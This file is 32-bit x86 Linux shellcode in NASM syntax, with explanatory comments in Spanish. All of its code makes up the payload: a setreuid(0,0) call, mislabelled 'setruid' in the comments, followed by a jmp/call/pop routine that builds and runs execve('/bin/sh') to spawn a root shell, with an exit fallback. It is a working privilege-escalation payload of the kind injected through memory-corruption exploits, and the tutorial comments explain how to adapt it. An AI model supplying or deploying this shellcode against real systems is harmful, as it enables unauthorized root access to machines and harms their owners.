BITS 32
; setruid(uid_t ruid, uid_t euid)
; -> Cambia a privilegios de root si root ejecutó el programa porque 
;    execve cambia los privilegios automáticamente a un usuario sin 
;    privilegios
   mov eax,70              ;setruid = función #70
   mov ebx,0               ;ruid = 0 (root)
   mov ecx,0               ;euid = 0 (root)
   int 0x80                ;llama al kernel para ejecutar setruid
   
   jmp short dos           ;salto hacia la llamada call
uno:
   pop esi                 ;obtiene la dirección de la cadena 
                           ; '/bin/sh...
         
; execve(const char *filename, char *const argv[], char *const envp[])
; -> Ejecuta un programa con sus argumentos y variables de ambiente
   mov eax,11              ;execve = función #11
   mov BYTE [esi+7],0      ;x se substituye con 0
   mov [esi+8],esi         ;aaaa se substituye con param_0
   mov DWORD [esi+12],0    ;bbbb se substituye con dword 0
   mov ebx,esi             ;filename = dir. de param_0
   lea ecx,[esi+8]         ;argv[] = dir. de param_0   
   lea edx,[esi+12]        ;envp[] = param_1
   int 0x80                ;llama a kernel para ejecutar execve
   
; exit(int status)
; -> Salida del programa (limpiamente), para evitar errores posteriores 
;    si falla llamada a execve
   mov eax,1               ;exit = función #1
   mov ebx,0               ;status = 0
   int 0x80                ;llama a kernel para ejecutar exit

dos:
   call uno                ;salta a 1 poniendo el inicio de 
                           ;la cadena que sigue en la pila,                             
                           ;como dirección de retorno
   db '/bin/shxaaaabbbb'

